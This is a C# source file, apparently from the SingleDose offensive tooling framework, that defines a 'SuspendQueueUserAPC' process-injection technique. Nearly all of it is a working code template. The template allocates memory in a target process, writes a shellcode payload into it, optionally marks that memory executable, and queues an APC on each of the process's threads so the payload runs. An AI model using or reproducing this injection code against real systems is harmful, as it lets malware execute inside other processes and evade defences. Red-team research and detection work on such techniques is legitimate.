using System.Collections.Generic;

namespace SingleDose.Techniques.Injects
{
    internal class SuspendQueueUserAPC : ITechnique
    {
        string ITechnique.TechniqueName => "SuspendQueueUserAPC";

        string ITechnique.TechniqueDescription => "This method suspends each thread in a target process. When the threads are resumed, the queue is checked and the shellcode will be executed.";

        List<string> ITechnique.TechniqueReferences => new List<string>() 
        {
            "https://sevrosecurity.com/2020/04/13/process-injection-part-2-queueuserapc/"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => false;

        List<string> ITechnique.Invokes => new List<string>() { "VirtualAllocEx", "WriteProcessMemory_ByteArray", "OpenThread", "QueueUserAPC", "CloseHandle"};

        List<string> ITechnique.Prerequisites => new List<string>() { "ProcessID" };

        string ITechnique.Base => @"
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace {{NAMESPACE}}
{
    public class Program
    {

        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            Process target = Process.GetProcessById({{PROCESSID}});
            IntPtr hAlloc = VirtualAllocEx(target.Handle, IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}}); 
            IntPtr NumByteWritten = IntPtr.Zero;
            WriteProcessMemory(target.Handle, hAlloc, payload, (uint)payload.Length, out NumByteWritten);
            {{PROTECT}}
            ProcessThreadCollection ptcThreads = target.Threads;
            for (int i = 0; i < ptcThreads.Count; i++)
            {
                try
                {
                    IntPtr hThread = OpenThread(0x2 | 0x8 | 0x10, false, ptcThreads[i].Id);
                    QueueUserAPC(hAlloc, hThread, IntPtr.Zero);
                    CloseHandle(hThread);
                }
                catch
                {
                    continue;
                }
            }
        }
        {{ARGS}}
        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(target.Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
